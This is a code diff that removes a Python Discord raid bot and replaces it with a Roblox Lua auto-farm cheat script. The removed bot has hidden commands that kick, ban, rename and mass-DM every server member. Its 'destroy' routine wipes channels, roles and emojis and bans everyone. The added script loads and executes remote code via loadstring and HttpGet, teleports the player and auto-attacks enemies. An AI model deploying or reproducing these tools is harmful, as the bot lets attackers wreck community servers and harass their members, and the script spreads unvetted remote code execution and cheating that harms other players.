@@ -1,160 +1,117 @@
-import discord
-from discord.ext import commands
-from discord.ext.commands import bot
-import asyncio
-import time
-import random
-intents = discord.Intents(messages=True, guilds=True, members=True)
-# Imports the needed libs.
+-- Tho Lnoob Hub - Auto Farm (Dùng đúng Melee đang trang bị)
 
-client = commands.Bot(command_prefix='$', intents=intents)
-# Sets prefix and intents
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local Window = Fluent:CreateWindow({
+    Title = "Tho Lnoob Hub",
+    SubTitle = "Auto Farm",
+    Size = UDim2.fromOffset(530, 350),
+    Theme = "Dark",
+    Acrylic = true
+})
 
-client.remove_command("help")
+-----------------------------------------------------
+-- Nút bật/tắt menu (Fluent không dùng Window.Enabled)
+-----------------------------------------------------
+local MenuVisible = true
 
-@client.event
-async def on_ready():
-    print ("Ah shit, here we go again")
+local toggleButton = Instance.new("ImageButton")
+toggleButton.Parent = game.CoreGui
+toggleButton.Position = UDim2.new(0.9, 0, 0.1, 0)
+toggleButton.Size = UDim2.new(0, 50, 0, 50)
+toggleButton.Image = "rbxassetid://89300403770535"
 
-@client.event
-async def on_server_join(server):
-    print("Joining {0}".format(server.name))
+toggleButton.MouseButton1Click:Connect(function()
+    MenuVisible = not MenuVisible
+    if MenuVisible then
+        Window:Show()
+    else
+        Window:Hide()
+    end
+end)
 
-####HELP COMMAND####
-@client.command(pass_context=True)
-async def secret(ctx):
-    await ctx.message.delete()
-    member = ctx.message.author
+-----------------------------------------------------
+-- Tabs
+-----------------------------------------------------
+local Tabs = {
+    Main = Window:AddTab({ Title = "Main Farm", Icon = "home" }),
+}
 
-    embed = discord.Embed(
-        colour = discord.Colour.blue()
-    )
+local AutoFarmEnabled = false
 
-    embed.set_author(name='Secret')
-    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
-    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
-    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
-    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
-    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
-    embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
-    embed.add_field(name='Info', value='Gives information of a user', inline=False)
-    await member.send(embed=embed)
-#############################
+Tabs.Main:AddButton({
+    Title = "Bật/Tắt Auto Farm",
+    Callback = function()
+        AutoFarmEnabled = not AutoFarmEnabled
+    end
+})
 
-####KALL COMMAND####
-@client.command(pass_context=True)
-async def kall(ctx):
-    await ctx.message.delete()
-    guild = ctx.message.guild
-    for member in list(client.get_all_members()):
-        try:
-            await guild.kick(member)
-            print (f"{member.name} has been kicked")
-        except:
-            print (f"{member.name} has FAILED to be kicked")
-        print ("Action completed: Kick all")
-#############################
+-----------------------------------------------------
+-- Auto Farm Variables
+-----------------------------------------------------
+local player = game.Players.LocalPlayer
+local vu = game:GetService("VirtualUser")
+local enemies = workspace:WaitForChild("Enemies")
 
-####BALL COMMAND####
-@client.command(pass_context=True)
-async def ball(ctx):
-    await ctx.message.delete()
-    guild = ctx.message.guild
-    for member in list(client.get_all_members()):
-        try:
-            await guild.ban(member)
-            print ("User " + member.name + " has been banned")
-        except:
-            pass
-    print ("Action completed: Ban all")
-#############################
+-----------------------------------------------------
+-- Tự cập nhật nhân vật khi chết
+-----------------------------------------------------
+local function getChar()
+    local c = player.Character or player.CharacterAdded:Wait()
+    return c, c:WaitForChild("HumanoidRootPart")
+end
 
-####RALL COMMAND####
-@client.command(pass_context=True)
-async def rall(ctx, rename_to):
-    await ctx.message.delete()
-    for member in list(client.get_all_members()):
-        try:
-            await member.edit(nick=rename_to)
-            print (f"{member.name} has been renamed to {rename_to}")
-        except:
-            print (f"{member.name} has NOT been renamed")
-        print("Action completed: Rename all")
-#############################
+-----------------------------------------------------
+-- Tìm quái gần nhất
+-----------------------------------------------------
+local function getClosestEnemy(hrp)
+    local closest, dist = nil, math.huge
+    for _, mob in pairs(enemies:GetChildren()) do
+        if mob:FindFirstChild("HumanoidRootPart") and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
+            local mag = (hrp.Position - mob.HumanoidRootPart.Position).Magnitude
+            if mag < dist then
+                closest, dist = mob, mag
+            end
+        end
+    end
+    return closest
+end
 
-####MALL COMMAND####
-@client.command(pass_context=True)
-async def mall(ctx):
-    await ctx.message.delete()
-    for member in list(client.get_all_members()):
-        await asyncio.sleep(0)
-        try:
-            await member.send("GET NUKED")
-        except:
-            pass
-        print("Action completed: Message all")
-#############################
+-----------------------------------------------------
+-- Gom quái
+-----------------------------------------------------
+local function gatherEnemies(hrp)
+    for _, mob in pairs(enemies:GetChildren()) do
+        if mob:FindFirstChild("HumanoidRootPart") and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
+            mob.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(math.random(-5, 5), 0, math.random(-5, 5))
+        end
+    end
+end
 
-###DESTROY COMMAND####
-@client.command(pass_context=True)
-async def destroy(ctx):
-    await ctx.message.delete()
-    for channel in list(ctx.message.guild.channels):
-        try:
-            await channel.delete()
-            print (channel.name + " has been deleted")
-        except:
-            pass
-        guild = ctx.message.guild
-        channel = await guild.create_text_channel("Ez Clap")
-        await channel.send("GET NUKED")
-    for role in list(ctx.guild.roles):
-        try:
-            await role.delete()
-            print (f"{role.name} has been deleted")
-        except:
-            pass
-    for member in list(client.get_all_members()):
-        try:
-            await guild.ban(member)
-            print ("User " + member.name + " has been banned")
-        except:
-            pass
-    for emoji in list(ctx.guild.emojis):
-        try:
-            await emoji.delete()
-            print (f"{emoji.name} has been deleted")
-        except:
-            pass    
-    print("Action completed: Nuclear Destruction")
-#############################
+-----------------------------------------------------
+-- Đánh bằng Melee đang trang bị
+-----------------------------------------------------
+local function attackWithMelee()
+    local tool = player.Character:FindFirstChildOfClass("Tool")
+    if tool and tool.ToolTip == "Melee" then
+        tool:Activate()
+    end
+end
 
+-----------------------------------------------------
+-- AUTO FARM LOOP
+-----------------------------------------------------
+task.spawn(function()
+    while true do
+        if AutoFarmEnabled then
+            local char, hrp = getChar()
+            local enemy = getClosestEnemy(hrp)
 
-####PING COMMAND####
-@client.command(pass_context=True)
-async def ping(ctx):
-    await ctx.message.delete()
-    member = ctx.message.author
-    channel = ctx.message.channel
-    t1 = time.perf_counter()
-    await channel.trigger_typing()
-    t2 = time.perf_counter()
-    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
-    await member.send(embed=embed)
-    print("Action completed: Server ping")
-#############################
-
-####INFO COMMAND####
-@client.command(pass_context=True)
-async def info(ctx, member: discord.Member=None):
-    await ctx.message.delete()
-    member = ctx.message.author
-    channel = ctx.message.channel
-    if member is None:
-        pass
-    else:
-        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
-    print("Action completed: User Info")
-#############################
-
-client.run("###################")
+            if enemy then
+                hrp.CFrame = enemy.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+                gatherEnemies(hrp)
+                attackWithMelee()
+            end
+        end
+        task.wait(0.3)
+    end
+end)
